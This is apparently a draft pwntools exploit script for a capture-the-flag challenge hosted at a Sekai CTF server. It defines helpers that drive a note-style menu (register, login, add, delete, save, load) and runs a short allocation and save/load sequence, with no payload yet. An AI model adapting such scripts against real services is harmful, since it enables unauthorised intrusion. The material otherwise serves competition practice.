from pwn import *
elf_file = FILENAME = './CParserPlugin.out'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'nolibc.chals.sekai.team'
POST = 1337


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b start''')


def regsiter(name):
    c.sendlineafter('ion:','2')
    c.sendlineafter(':',str(name))
    c.sendlineafter(':',str(name))

def login(name):
    c.sendlineafter('ion:','1')
    c.sendlineafter(':',str(name))
    c.sendlineafter(':',str(name))

def add_s(n,s):
    c.sendlineafter(':','1')
    c.sendlineafter(':',str(n))
    c.sendlineafter(':',str(s))

def del_s(n):
    c.sendlineafter(':','2')
    c.sendlineafter(':',str(n))

def view():
    c.sendlineafter(':','3')

def save(s):
    c.sendlineafter(':','4')
    c.sendlineafter(':',str(s))

def load(s):
    c.sendlineafter(':','5')
    c.sendlineafter(':',str(s))


regsiter("a")
login("a")

add_s(0x40,0)
add_s(0x40,1)
add_s(0x40,2)

save(0)
load(0)

save(1)

c.interactive()